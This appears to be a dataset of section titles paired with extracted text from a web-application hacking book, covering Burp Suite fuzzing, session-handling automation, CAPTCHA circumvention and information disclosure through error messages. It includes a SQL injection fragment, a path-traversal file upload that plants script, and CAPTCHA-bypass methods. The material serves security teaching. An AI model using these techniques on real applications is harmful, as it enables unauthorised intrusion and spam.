Page 600\n600 Chapter 14 n Automating Customized Attacks\nFigure 14-7: Cycling through function index values and extracting the title\nof each resulting page\nAttack 3: Application Fuzzing\nIn addition to exploiting the bugs already identifi ed, you should, of course, probe\nthe target application for common vulnerabilities. To ensure decent coverage,\nyou should test every parameter and request, starting from the login request\nonward.\nTo perform a quick fuzz test of a given request, you need to set payload posi-\ntions at all the request parameters. You can do this simply by clicking the auto\nbutton on the positions tab, as shown in Figure 14-8.\nYou then need to confi gure a set of attack strings to use as payloads and some\ncommon error messages to search responses for. Intruder contains built-in sets\nof strings for both of these uses.\nAs with the fuzzing attack performed using JAttack, you then need to manually\nreview the table of results to identify any anomalies that merit further investiga-\ntion, as shown in Figure 14-9. As before, you can click column headings to sort\nthe responses in various ways to help identify interesting cases.\ncc1144..iinndddd 660000 88//1199//22001111 1122::1155::2244 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 601\nChapter 14 n Automating Customized Attacks 601\nFigure 14-8: Configuring Burp Intruder to fuzz a login request\nFigure 14-9: Results from fuzzing a single request\ncc1144..iinndddd 660011 88//1199//22001111 1122::1155::2244 PPMM"
  },
  {
    "input": "Session-Handling Mechanisms",
    "output": "Stuttard c14.indd V3 - 08/11/2011 Page 602\n602 Chapter 14 n Automating Customized Attacks\nFrom an initial look at the results, it appears that the application is vulnerable\nto SQL injection. In both payload positions, when a single quotation mark is\nsubmitted, the application returns a different response with a message contain-\ning the strings quotation and syntax. This behavior defi nitely warrants some\nmanual investigation to confi rm and exploit the bug.\nTRY IT!\nhttp://mdsec.net/auth/502/\nTIP You can right-click any interesting-looking result and send the response\nto the Burp Repeater tool. This enables you to modify the request manually\nand reissue it multiple times to test the application’s handling of different\npayloads, probe for fi lter bypasses, or deliver actual exploits.\nBarriers to Automation\nIn many applications, the techniques described so far in this chapter can be\napplied without any problems. In other cases, however, you may encounter\nvarious obstacles that prevent you from straightforwardly performing custom-\nized automated attacks.\nBarriers to automation typically fall into two categories:\nn Session-handling mechanisms that defensively terminate sessions in\nresponse to unexpected requests, employ ephemeral parameter values\nsuch as anti-CSRF tokens that change per request (see Chapter 13), or\ninvolve multistage processes.\nn CAPTCHA controls designed to prevent automated tools from accessing a\nparticular application function, such as a function to register new user accounts.\nWe will examine each of these situations and describe ways in which you\nmay be able to circumvent the barriers to automation, either by refi ning your\nautomated tools or by fi nding defects in the application’s defenses.\nSession-Handling Mechanisms\nMany applications employ session-handling mechanisms and other stateful\nfunctionality that can present problems for automated testing. Here are some\nsituations in which obstacles can arise:\ncc1144..iinndddd 660022 88//1199//22001111 1122::1155::2255 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 603\nChapter 14 n Automating Customized Attacks 603\nn While you are testing a request, the application terminates the session\nbeing used for testing, either defensively or for other reasons, and the\nremainder of the testing exercise is ineffective.\nn An application function employs a changing token that must be supplied\nwith each request (for example, to prevent request forgery attacks).\nn The request being tested appears within a multistage process. The request\nis handled properly only if a series of other requests have fi rst been made\nto get the application into a suitable state.\nObstacles of this kind can always be circumvented in principle by refi ning\nyour automation techniques to work with whatever mechanisms the appli-\ncation is using. If you are writing your own testing code along the lines of\nJAttack, you can directly implement support for specifi c token-handling or\nmultistage mechanisms. However, this approach can be complex and does\nnot scale very well to large applications. In practice, the need to write new\ncustom code to deal with each new instance of a problem may itself present a\nsignifi cant barrier to using automation, and you may fi nd yourself reverting\nto slower manual techniques.\nSession-Handling Support in Burp Suite\nFortunately, Burp Suite provides a range of features to handle all these situations\nin as painless a manner as possible, allowing you to continue your testing while\nBurp deals with the obstacles seamlessly in the background. These features are\nbased on the following components:\nn Cookie jar\nn Request macros\nn Session-handling rules\nWe will briefl y describe how these features can be combined to overcome\nbarriers to automation and allow you to continue testing in the various situ-\nations described. More detailed help is available in the Burp Suite online\ndocumentation.\nCookie Jar\nBurp Suite maintains its own cookie jar, which tracks application cookies used\nby your browser and by Burp’s own tools. You can confi gure how Burp auto-\nmatically updates the cookie jar, and you also can view and edit its contents\ndirectly, as shown in Figure 14-10.\ncc1144..iinndddd 660033 88//1199//22001111 1122::1155::2255 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 604\n604 Chapter 14 n Automating Customized Attacks\nFigure 14-10: The Burp Suite cookie jar\nIn itself, the cookie jar does not actually do anything, but the key values it tracks\ncan be used within the other components of Burp’s session-handling support.\nRequest Macros\nA macro is a predefi ned sequence of one or more requests. Macros can be used\nto perform various session-related tasks, including the following:\nn Fetching a page of the application (such as the user’s home page) to check\nthat the current session is still valid\nn Performing a login to obtain a new valid session\nn Obtaining a token or nonce to use as a parameter in another request\nn When scanning or fuzzing a request in a multistep process, performing\nthe necessary preceding requests to get the application into a state where\nthe targeted request will be accepted\nMacros are recorded using your browser. When defi ning a macro, Burp dis-\nplays a view of the Proxy history, from which you can select the requests to be\nused for the macro. You can select from previously made requests, or record the\nmacro afresh and select the new items from the history, as shown in Figure 14-11.\nFor each item in the macro, the following settings can be confi gured, as shown\nin Figure 14-12:\nn Whether cookies from the cookie jar should be added to the request\nn Whether cookies received in the response should be added to the cookie jar\nn For each parameter in the request, whether it should use a preset value\nor a value derived from a previous response in the macro\ncc1144..iinndddd 660044 88//1199//22001111 1122::1155::2255 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 605\nChapter 14 n Automating Customized Attacks 605\nFigure 14-11: Recording a request macro in Burp Suite\nFigure 14-12: Configuring cookie and parameter handling for a macro item\ncc1144..iinndddd 660055 88//1199//22001111 1122::1155::2255 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 606\n606 Chapter 14 n Automating Customized Attacks\nThe ability to derive a parameter’s value from a previous response in the\nmacro is particularly useful in some multistage processes and in situations\nwhere applications make aggressive use of anti-CSRF tokens. When you\ndefi ne a new macro, Burp tries to automatically fi nd any relationships of\nthis kind by identifying parameters whose values can be determined from\nthe preceding response (form fi eld values, redirection targets, query strings\nin links).\nSession-Handling Rules\nThe key component of Burp Suite’s session-handling support is the facility to\ndefi ne session-handling rules, which make use of the cookie jar and request\nmacros to deal with specifi c barriers to automation.\nEach rule comprises a scope (what the rule applies to) and actions (what the\nrule does). For every outgoing request that Burp makes, it determines which\nof the defi ned rules are in scope for the request and performs all those rules’\nactions in order.\nThe scope for each rule can be defi ned based on any or all of the following\nfeatures of the request being processed, as shown in Figure 14-13:\nn The Burp tool that is making the request\nn The URL of the request\nn The names of parameters within the request\nEach rule can perform one or more actions, as shown in Figure 14-14, includ-\ning the following:\nn Add cookies from the session-handling cookie jar.\nn Set a specifi c cookie or parameter value.\nn Check whether the current session is valid, and perform subactions con-\nditionally on the result.\nn Run a macro.\nn Prompt the user for in-browser session recovery.\nAll these actions are highly configurable and can be combined in\narbitrary ways to deal with virtually any session-handling mechanism.\nBeing able to run a macro and update specifi ed cookie and parameter values\nbased on the result allows you to automatically log back in to an applica-\ntion when you are logged out. Being able to prompt for in-browser session\nrecovery enables you to work with login mechanisms that involve keying\na number from a physical token or solving a CAPTCHA puzzle (described\nin the next section).\ncc1144..iinndddd 660066 88//1199//22001111 1122::1155::2255 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 607\nChapter 14 n Automating Customized Attacks 607\nFigure 14-13: Configuring the scope of a session-handling rule\nFigure 14-14: Configuring actions for a session-handling rule\ncc1144..iinndddd 660077 88//1199//22001111 1122::1155::2255 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 608\n608 Chapter 14 n Automating Customized Attacks\nBy creating multiple rules with different scopes and actions, you can defi ne\na hierarchy of behavior that Burp will apply to different URLs and parameters.\nFor example, suppose you are testing an application that frequently terminates\nyour session in response to unexpected requests and also makes liberal use of\nan anti-CSRF token called __csrftoken. In this situation you could defi ne the\nfollowing rules, as shown in Figure 14-15:\nn For all requests, add cookies from Burp’s cookie jar.\nn For requests to the application’s domain, validate that the current session\nwith the application is still active. If it isn’t, run a macro to log back in to\nthe application, and update the cookie jar with the resulting session token.\nn For requests to the application containing the __csrftoken parameter,\nfi rst run a macro to obtain a valid __csrftoken value, and use this when\nmaking the request.\nFigure 14-15: A set of session-handling rules to handle session termination and\nanti-CSRF tokens used by an application\ncc1144..iinndddd 660088 88//1199//22001111 1122::1155::2266 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 609\nChapter 14 n Automating Customized Attacks 609\nThe confi guration needed to apply Burp’s session handling functionality to\nthe features of real-world applications is often complex, and mistakes are easily\nmade. Burp provides a tracer function for troubleshooting the session handling\nconfi guration. This function shows you all of the steps performed when Burp\napplies session handling rules to a request, allowing you to see exactly how\nrequests are being updated and issued, and identify whether your confi gura-\ntion is working in the way that you intended. The session handling tracer is\nshown in Figure 14-16.\nFigure 14-16: Burp’s session handling tracer, which lets you monitor and debug your\nsession handling rules\nHaving confi gured and tested the rules and macros that you need to work\nwith the application you are targeting, you can continue your manual and auto-\nmated testing in the normal way, just as if the obstacles to testing did not exist.\ncc1144..iinndddd 660099 88//1199//22001111 1122::1155::2266 PPMM"
  },
  {
    "input": "CAPTCHA Controls",
    "output": "Stuttard c14.indd V3 - 08/11/2011 Page 610\n610 Chapter 14 n Automating Customized Attacks\nCAPTCHA Controls\nCAPTCHA controls are designed to prevent certain application functions from\nbeing used in an automated way. They are most commonly employed in functions\nfor registering e-mail accounts and posting blog comments to try to reduce spam.\nCAPTCHA is an acronym for Completely Automated Public Turing test to tell\nComputers and Humans Apart. These tests normally take the form of a puzzle\ncontaining a distorted-looking word, which the user must read and enter into\na fi eld on the form being submitted. Puzzles may also involve recognition of\nparticular animals and plants, orientation of images, and so on.\nCAPTCHA puzzles are intended to be easy for a human to solve but diffi cult\nfor a computer. Because of the monetary value to spammers of circumventing\nthese controls, an arms race has occurred in which typical CAPTCHA puzzles\nhave become increasingly diffi cult for a human to solve, as shown in Figure\n14-17. As the CAPTCHA-solving capabilities of humans and computers converge,\nit is likely that these puzzles will become increasingly ineffective as a defense\nagainst spam, and they may be abandoned. They also present accessibility issues\nthat currently are not fully resolved.\nFigure 14-17: A CAPTCHA puzzle\nCAPTCHA puzzles can be circumvented in various ways, only some of which\nare applicable in the context of performing security testing.\nAttacking CAPTCHA Implementations\nThe most fruitful place to look for ways to bypass a CAPTCHA control is the\nimplementation of how the puzzle is delivered to the user and how the applica-\ntion handles the user’s solution.\nA surprising number of CAPTCHA implementations expose the puzzle solu-\ntion to the client in textual form. This can arise in various ways:\nn The puzzle image is loaded via a URL that includes the solution as a\nparameter, or the image name is set to the CAPTCHA solution.\nn The puzzle solution is stored in a hidden form fi eld.\nn The puzzle solution appears within an HTML comment or other location\nfor debugging purposes.\nIn these situations, it is easy for a scripted attack to retrieve the response that\ncontains the puzzle solution and submit it in the next attack request.\ncc1144..iinndddd 661100 88//1199//22001111 1122::1155::2277 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 611\nChapter 14 n Automating Customized Attacks 611\nTRY IT!\nhttp://mdsec.net/feedback/12/\nhttp://mdsec.net/feedback/24/\nhttp://mdsec.net/feedback/31/\nA further common bug in CAPTCHA implementations is that a puzzle can be\nsolved manually on a single occasion, and the solution can be replayed in multiple\nrequests. Normally, each puzzle should be valid for only a single attempt, and\nthe application should discard it when an attempted solution is received. If this\nis not done, it is straightforward to solve a puzzle once in the normal way and\nthen use the solution to perform an unlimited number of automated requests.\nTRY IT!\nhttp://mdsec.net/feedback/39/\nNOTE Some applications have a deliberate code path that circumvents the\nCAPTCHA to permit use by certain authorized automated processes. In these\ninstances, it is often possible to bypass the CAPTCHA simply by not supplying\nthe relevant parameter name.\nAutomatically Solving CAPTCHA Puzzles\nIn principle, most types of CAPTCHA puzzles can be solved by a computer, and\nin practice, many high-profi le puzzle algorithms have been defeated in this way.\nFor standard puzzles involving a distorted word, solving the puzzle involves\nthe following steps:\n1. Removal of noise from the image\n2. Segmentation of the image into individual letters\n3. Recognition of the letter in each segment\nWith today’s technology, computers are quite effective at removing noise and\nrecognizing letters that have been correctly segmented. The most signifi cant\nchallenges arise with segmenting the image into letters, particularly where\nletters overlap and are heavily distorted.\nFor simple puzzles in which segmentation into letters is trivial, it is likely\nthat some homegrown code can be used to remove image noise and pass the\ntext into an existing OCR (optical character recognition) library to recognize the\nletters. For more complex puzzles in which segmentation is a serious challenge,\ncc1144..iinndddd 661111 88//1199//22001111 1122::1155::2277 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 612\n612 Chapter 14 n Automating Customized Attacks\nvarious research projects have successfully compromised the CAPTCHA puzzles\nof high-profi le web applications.\nFor other types of puzzles, a different approach is needed, tailored to the\nnature of the puzzle images. For example, puzzles involving recognition of\nanimals or orientation of objects need to use a database of real images, which\nare reused in multiple puzzles. If the database is suffi ciently small, an attacker\ncan manually solve enough images in the database to make an attack feasible.\nEven if noise and other distortions are applied to images, to make each reused\nimage appear different to a computer, fuzzy image hashes and color histogram\ncomparison can often be used to match the image from a given puzzle with one\nthat has already been solved manually.\nMicrosoft’s Asirra puzzles use a database of several million images of cats\nand dogs, derived from a real-world directory of adoptable pets. For an attacker\nwith a big enough monetary incentive, even this database could be solved eco-\nnomically using human solvers, as described in the next section.\nIn all these cases, it is worth noting that to effectively circumvent a CAPTCHA\ncontrol, you don’t need to be able to solve puzzles with perfect accuracy. For\nexample, an attack that solved only 10% of puzzles correctly could still be highly\neffective at performing automated security testing, or delivering spam, as the\ncase may be. An automated exercise that takes ten times as many requests nor-\nmally is still faster and less painful than the corresponding manual exercise.\nTRY IT!\nhttp://mdsec.net/feedback/8/\nUsing Human Solvers\nCriminals who need to solve large numbers of CAPTCHA puzzles sometimes\nemploy techniques that are not applicable in the context of web application\nsecurity testing:\nn An apparently benign website can be used to induce human CAPTCHA\nproxies to solve puzzles that are passed through from the application being\ntargeted. Typically, the attacker offers the inducement of a competition\nprize, or free access to pornography, to entice users. When a user completes\nthe registration form, he is presented with a CAPTCHA puzzle that has\nbeen fetched in real time from the target application. When the user solves\nthe puzzle, his solution is relayed to the target application.\nn Attackers can pay human CAPTCHAdrones in developing countries to\nsolve large numbers of puzzles. Some companies offer this service, which\ncosts less than $1 for every 1,000 puzzles that are solved.\ncc1144..iinndddd 661122 88//1199//22001111 1122::1155::2277 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c14.indd V3 - 08/11/2011 Page 613\nChapter 14 n Automating Customized Attacks 613\nSummary\nWhen you are attacking a web application, the majority of the necessary tasks\nneed to be tailored to that application’s behavior and the methods by which it\nenables you to interact with and manipulate it. Because of this, you will often\nfi nd yourself working manually, submitting individually crafted requests and\nreviewing the application’s responses.\nThe techniques described in this chapter are conceptually intuitive. They\ninvolve leveraging automation to make these customized tasks easier, faster,\nand more effective. It is possible to automate virtually any manual procedure\nyou want to carry out using the power and reliability of your own computer to\nattack your target’s defects and weak points.\nIn some cases, obstacles exist that prevent you from straightforwardly apply-\ning automated techniques. Nevertheless, in most cases these can be overcome\neither by refi ning your automated tools or by fi nding a weakness in the appli-\ncation’s defenses.\nAlthough conceptually straightforward, using customized automation effec-\ntively requires experience, skill, and imagination. You can use tools to help, or\nyou can write your own. But there is no substitute for the intelligent human\ninput that distinguishes a truly accomplished web application hacker from a\nmere amateur. When you have mastered all the techniques described in the\nother chapters, you should return to this topic and practice the different ways\nin which customized automation can be used to apply those techniques.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. Name three identifi ers of hits when using automation to enumerate identi-\nfi ers within an application.\n2. For each of the following categories, identify one fuzz string that can often\nbe used to identify it:\n(a) SQL injection\n(b) OS command injection\n(c) Path traversal\n(d) Script fi le inclusion\n3. When you are fuzzing a request that contains a number of different param-\neters, why is it important to perform requests targeting each parameter\nin turn and leaving the others unmodifi ed?\ncc1144..iinndddd 661133 88//1199//22001111 1122::1155::2277 PPMM\nStuttard c14.indd V3 - 08/11/2011 Page 614\n614 Chapter 14 n Automating Customized Attacks\n4. You are formulating an automated attack to brute-force a login function\nto discover additional account credentials. You fi nd that the application\nreturns an HTTP redirection to the same URL regardless of whether you\nsubmit valid or invalid credentials. In this situation, what is the most likely\nmeans you can use to detect hits?\n5. When you are using an automated attack to harvest data from within the\napplication, you will often fi nd that the information you are interested in\nis preceded by a static string that enables you to easily capture the data\nfollowing it. For example:\n<input type=”text” name=”LastName” value=”\nOn other occasions, you may fi nd that this is not the case and that the data\npreceding the information you need is more variable. In this situation,\nhow can you devise an automated attack that still fulfi lls your needs?\ncc1144..iinndddd 661144 88//1199//22001111 1122::1155::2277 PPMM"
  },
  {
    "input": "Exploiting Error Messages",
    "output": "Stuttard c15.indd V2 - 08/17/2011 Page 615\nCHAPTER\n15\nExploiting Information\nDisclosure\nChapter 4 described various techniques you can use to map a target applica-\ntion and gain an initial understanding of how it works. That methodology\ninvolved interacting with the application in largely benign ways to catalog its\ncontent and functionality, determine the technologies in use, and identify the\nkey attack surface.\nThis chapter describes ways in which you can extract further information\nfrom an application during an actual attack. This mainly involves interacting\nwith the application in unexpected and malicious ways and exploiting anoma-\nlies in the application’s behavior to extract information that is of value to you.\nIf successful, such an attack may enable you to retrieve sensitive data such as\nuser credentials, gain a deeper understanding of an error condition to fi ne-tune\nyour attack, discover more details about the technologies in use, and map the\napplication’s internal structure and functionality.\nExploiting Error Messages\nMany web applications return informative error messages when unexpected\nevents occur. These may range from simple built-in messages that disclose only\nthe category of the error to full-blown debugging information that gives away\na lot of details about the application’s state.\n615\ncc1155..iinndddd 661155 88//1199//22001111 1122::1166::0066 PPMM"
  },
  {
    "input": "Script Error Messages",
    "output": "Stuttard c15.indd V2 - 08/17/2011 Page 616\n616 Chapter 15 n Exploiting Information Disclosure\nMost applications are subject to various kinds of usability testing prior to\ndeployment. This testing typically identifi es most error conditions that may\narise when the application is being used in the normal way. Therefore, these\nconditions usually are handled in a graceful manner that does not involve any\ntechnical messages being returned to the user. However, when an application\nis under active attack, it is likely that a much wider range of error conditions\nwill arise, which may result in more detailed information being returned to the\nuser. Even the most security-critical applications, such as those used by online\nbanks, have been found to return highly verbose debugging output when a\nsuffi ciently unusual error condition is generated.\nScript Error Messages\nWhen an error arises in an interpreted web scripting language, such as VBScript,\nthe application typically returns a simple message disclosing the nature of the\nerror, and possibly the line number of the fi le where the error occurred. For\nexample:\nMicrosoft VBScript runtime error 800a0009\nSubscript out of range: [number -1]\n/register.asp, line 821\nThis kind of message typically does not contain any sensitive information\nabout the state of the application or the data being processed. However, it may\nhelp you narrow down the focus of your attack. For example, when you are\ninserting different attack strings into a specifi c parameter to probe for common\nvulnerabilities, you may encounter the following message:\nMicrosoft VBScript runtime error ‘800a000d’\nType mismatch: ‘ [string: “’”]’\n/scripts/confirmOrder.asp, line 715\nThis message indicates that the value you have modifi ed is probably being\nassigned to a numeric variable, and you have supplied input that cannot be so\nassigned because it contains nonnumeric characters. In this situation, it is highly\nlikely that nothing can be gained by submitting nonnumeric attack strings as\nthis parameter. So for many categories of bugs, you are better off targeting\nother parameters.\nA different way in which this type of error message may assist you is in\ngiving you a better understanding of the logic that is implemented within the\nserver-side application. Because the message discloses the line number where\nthe error occurred, you may be able to confi rm whether two different malformed\nrequests are triggering the same error or different errors. You may also be able\ncc1155..iinndddd 661166 88//1199//22001111 1122::1166::0077 PPMM"
  },
  {
    "input": "Stack Traces",
    "output": "Stuttard c15.indd V2 - 08/17/2011 Page 617\nChapter 15 n Exploiting Information Disclosure 617\nto determine the sequence in which different parameters are processed by\nsubmitting bad input within multiple parameters and identifying the location\nat which an error occurs. By systematically manipulating different parameters,\nyou may be able to map the different code paths being executed on the server.\nStack Traces\nMost web applications are written in languages that are more complex than\nsimple scripts but that still run in a managed execution environment, such\nas Java, C#, or Visual Basic .NET. When an unhandled error occurs in these\nlanguages, it is common to see full stack traces being returned to the browser.\nA stack trace is a structured error message that begins with a description\nof the actual error. This is followed by a series of lines describing the state of\nthe execution call stack when the error occurred. The top line of the call stack\nshows the function that generated the error, the next line shows the function\nthat invoked the previous function, and so on down the call stack until the\nhierarchy of function calls is exhausted.\nThe following is an example of a stack trace generated by an ASP.NET\napplication:\n[HttpException (0x80004005): Cannot use a leading .. to exit above the\ntop directory.]\nSystem.Web.Util.UrlPath.Reduce(String path) +701\nSystem.Web.Util.UrlPath.Combine(String basepath, String relative)+304\nSystem.Web.UI.Control.ResolveUrl(String relativeUrl) +143\nPBSApp.StatFunc.Web.MemberAwarePage.Redirect(String url) +130\nPBSApp.StatFunc.Web.MemberAwarePage.Process() +201\nPBSApp.StatFunc.Web.MemberAwarePage.OnLoad(EventArgs e)\nSystem.Web.UI.Control.LoadRecursive() +35\nSystem.Web.UI.Page.ProcessRequestMain() +750\nVersion Information: Microsoft .NET Framework Version:1.1.4322.2300;\nASP.NET Version:1.1.4322.2300\nThis kind of error message provides a large amount of useful information\nthat may assist you in fi ne-tuning your attack against the application:\nn It often describes the precise reason why an error occurred. This may\nenable you to adjust your input to circumvent the error condition and\nadvance your attack.\nn The call stack typically makes reference to a number of library and third-\nparty code components that are being used within the application. You\ncan review the documentation for these components to understand their\nintended behavior and assumptions. You can also create your own local\ncc1155..iinndddd 661177 88//1199//22001111 1122::1166::0077 PPMM"
  },
  {
    "input": "Informative Debug Messages",
    "output": "Stuttard c15.indd V2 - 08/17/2011 Page 618\n618 Chapter 15 n Exploiting Information Disclosure\nimplementation and test this to understand the ways in which it handles\nunexpected input and potentially identify vulnerabilities.\nn The call stack includes the names of the proprietary code components\nbeing used to process the request. The naming scheme for these and the\ninterrelationships between them may allow you to infer details about the\napplication’s internal structure and functionality.\nn The stack trace often includes line numbers. As with the simple\nscript error messages described previously, these may enable you\nto probe and understand the internal logic of individual application\ncomponents.\nn The error message often includes additional information about the appli-\ncation and the environment in which it is running. In the preceding\nexample, you can determine the exact version of the ASP.NET platform\nbeing used. This enables you to investigate the platform for known or\nnew vulnerabilities, anomalous behavior, common confi guration errors,\nand so on.\nInformative Debug Messages\nSome applications generate custom error messages that contain a large amount\nof debug information. These are usually implemented to facilitate debugging\nduring development and testing and often contain rich detail about the applica-\ntion’s runtime state. For example:\n-------------------------------------------\n* * * S E S S I O N * * *\n-------------------------------------------\ni5agor2n2pw3gp551pszsb55\nSessionUser.Sessions App.FEStructure.Sessions\nSessionUser.Auth 1\nSessionUser.BranchID 103\nSessionUser.CompanyID 76\nSessionUser.BrokerRef RRadv0\nSessionUser.UserID 229\nSessionUser.Training 0\nSessionUser.NetworkID 11\nSessionUser.BrandingPath FE\nLoginURL /Default/fedefault.aspx\nReturnURL ../default/fedefault.aspx\nSessionUser.Key f7e50aef8fadd30f31f3aea104cef26ed2ce2be50073c\nSessionClient.ID 306\nSessionClient.ReviewID 245\nUPriv.2100\ncc1155..iinndddd 661188 88//1199//22001111 1122::1166::0077 PPMM"
  },
  {
    "input": "Server and Database Messages",
    "output": "Stuttard c15.indd V2 - 08/17/2011 Page 619\nChapter 15 n Exploiting Information Disclosure 619\nSessionUser.NetworkLevelUser 0\nUPriv.2200\nSessionUser.BranchLevelUser 0\nSessionDatabase fd219.prod.wahh-bank.com\nThe following items are commonly included in verbose debug messages:\nn Values of key session variables that can be manipulated via user input\nn Hostnames and credentials for back-end components such as databases\nn File and directory names on the server\nn Information embedded within meaningful session tokens (see Chapter 7)\nn Encryption keys used to protect data transmitted via the client (see Chapter 5)\nn Debug information for exceptions arising in native code components,\nincluding the values of CPU registers, contents of the stack, and a list of\nthe loaded DLLs and their base addresses (see Chapter 16)\nWhen this kind of error reporting functionality is present in live production\ncode, it may signify a critical weakness in the application’s security. You should\nreview it closely to identify any items that can be used to further advance your\nattack, and any ways in which you can supply crafted input to manipulate the\napplication’s state and control the information retrieved.\nServer and Database Messages\nInformative error messages are often returned not by the application itself but\nby some back-end component such as a database, mail server, or SOAP server. If\na completely unhandled error occurs, the application typically responds with an\nHTTP 500 status code, and the response body may contain further information\nabout the error. In other cases, the application may handle the error gracefully\nand return a customized message to the user, sometimes including error infor-\nmation generated by the back-end component. In some situations, information\ndisclosure can itself be used as a conduit for an attack. The information disclosed\nby an application in a debug message or exception is often unintentional and\nas a result the organization’s security procedures may entirely overlook the\nexistence of the disclosure.\nThe error returned may enable a range of further attacks, as described in the\nfollowing sections.\nUsing Information Disclosure to Advance an Attack\nWhen a specifi c attack is launched against a server back-end component, it is\ncommon for that component to give direct feedback on any errors encountered.\nThis can help you fi ne-tune the attack. Database error messages often contain\ncc1155..iinndddd 661199 88//1199//22001111 1122::1166::0077 PPMM\nStuttard c15.indd V2 - 08/17/2011 Page 620\n620 Chapter 15 n Exploiting Information Disclosure\nuseful information. For example, they often disclose the query that generated\nthe error, enabling you to fi ne-tune a SQL injection attack:\nFailed to retrieve row with statement - SELECT object_data FROM\ndeftr.tblobject WHERE object_id = ‘FDJE00012’ AND project_id = ‘FOO’\nand 1=2--’\nSee Chapter 9 for a detailed methodology describing how to develop database\nattacks and extract information based on error messages.\nCross-Site Scripting Attacks Within Error Messages\nAs described in Chapter 12, securing against cross-site scripting is an arduous\ntask, requiring identifi cation of each output location of user-supplied data.\nAlthough most frameworks automatically HTML-encode data when reporting\nerrors, this is by no means universal. Error messages can appear in multiple,\noften unusual places within an HTTP response. In the HttpServletResponse\n.sendError() call used by Tomcat, the error data is also part of the response\nheader:\nHTTP/1.1 500 General Error Accessing Doc10083011\nServer: Apache-Coyote/1.1\nContent-Type: text/html;charset=ISO-8859-1\nContent-Length: 1105\nDate: Sat, 23 Apr 2011 08:52:15 GMT\nConnection: close\nAn attacker who has control over the input string Doc10083011 could sup-\nply carriage return characters and conduct an HTTP header injection attack,\nor a cross-site scripting attack within the HTTP response. More details can be\nfound here:\nhttp://www.securityfocus.com/archive/1/495021/100/0/threaded\nFrequently customized error messages are intended for a non-HTML desti-\nnation, such as a console, yet they are erroneously reported to the user in an\nHTTP response. In these situations, cross-site scripting is often easily exploitable.\nDecryption Oracles in Information Disclosure\nChapter 11 gave an example of how an unintentional “encryption oracle” could\nbe harnessed to decrypt strings presented to the user in encrypted format. The\nsame issue can apply to information disclosure. Chapter 7 gave an example of\nan application that provided an encrypted download link for fi le access. If a fi le\nhad since been moved or deleted, the application reported that the fi le could\nnot be downloaded. Of course, the error message contained the fi le’s decrypted\ncc1155..iinndddd 662200 88//1199//22001111 1122::1166::0077 PPMM\nStuttard c15.indd V2 - 08/17/2011 Page 621\nChapter 15 n Exploiting Information Disclosure 621\nvalue, so any encrypted “fi lename” could be provided to the download link,\nresulting in an error.\nIn these cases, the information disclosure resulted from abuse of deliberate\nfeedback. It is also possible for information disclosure to be more accidental if\nparameters are decrypted and then used in various functions, any of which may\nlog data or generate error messages. An example encountered by the authors\nwas a complex work fl ow application that made use of encrypted parameters\ntransmitted via the client. Swapping the default values used for dbid and grou-\nphome, the application responded with an error:\njava.sql.SQLException: Listener refused the connection with the\nfollowing error: ORA-12505, TNS:listener does not currently know\nof SID given in connect descriptor The Connection descriptor used\nby the client was: 172.16.214.154:1521:docs/londonoffice/2010/general\nThis provided considerable insight. Specifi cally, dbid was actually an encrypted\nSID for a connection to an Oracle database (the connection descriptor takes the\nform Server:Port:SID), and grouphome was an encrypted fi le path.\nIn an attack analogous to many other information disclosure attacks, knowl-\nedge of the fi le path provided the necessary information to conduct a fi le path\nmanipulation attack. Supplying exactly three path traversal characters in a\nfi lename, and navigating up a similar directory structure, it was possible to\nupload fi les containing malicious script directly into another group’s work\nspace:\nPOST /dashboard/utils/fileupload HTTP/1.1\nAccept: text/html, application/xhtml+xml, */*\nReferer: http://wahh/dashboard/common/newnote\nAccept-Language: en-GB\nContent-Type: multipart/form-data; boundary=------7db3d439b04c0\nAccept-Encoding: gzip, deflate\nHost: wahh\nContent-Length: 8088\nProxy-Connection: Keep-Alive\n--------7db3d439b04c0\nContent-Disposition: form-data; name=”MAX_FILE_SIZE”\n100000\n--------7db3d439b04c0\nContent-Disposition: form-data; name=”uploadedfile”; filename=”../../../\nnewportoffice/2010/general/xss.html”\nContent-Type: text/html\n<html><body><script>...\n...\ncc1155..iinndddd 662211 88//1199//22001111 1122::1166::0077 PPMM\nStuttard c15.indd V2 - 08/17/2011 Page 622\n622 Chapter 15 n Exploiting Information Disclosure\nHACK STEPS\n1. When you are probing the application for common vulnerabilities by sub-\nmitting crafted attack strings in different parameters, always monitor the\napplication’s responses to identify any error messages that may contain\nuseful information.\nAttempt to force an error response from the application by supplying\nencrypted data strings in the wrong context, or by performing actions on\nresources that are not in the correct state to handle the action.\n2. Be aware that error information that is returned within the server’s\nresponse may not be rendered on-screen within the browser. An efficient\nway to identify many error conditions is to search each raw response for\nkeywords that are often contained in error messages. For example:\nn error\nn exception\nn illegal\nn invalid\nn fail\nn stack\nn access\nn directory\nn file\nn not found\nn varchar\nn ODBC\nn SQL\nn SELECT\n3. When you send a series of requests modifying parameters within a base\nrequest, check whether the original response already contains any of the\nkeywords you are looking for to avoid false positives.\n4. You can use the Grep function of Burp Intruder to quickly identify any\noccurrences of interesting keywords in any of the responses generated by\na given attack (see Chapter 14). Where matches are found, review the rel-\nevant responses manually to determine whether any useful error informa-\ntion has been returned.\nTIP If you are viewing the server’s responses in-browser, be aware that\nInternet Explorer by default hides many error messages and replaces them with\na generic page. You can disable this behavior by choosing Tools ➢ Internet\nOptions and then choosing the Advanced tab.\ncc1155..iinndddd 662222 88//1199//22001111 1122::1166::0077 PPMM"
  },
  {
    "input": "Using Public Information",
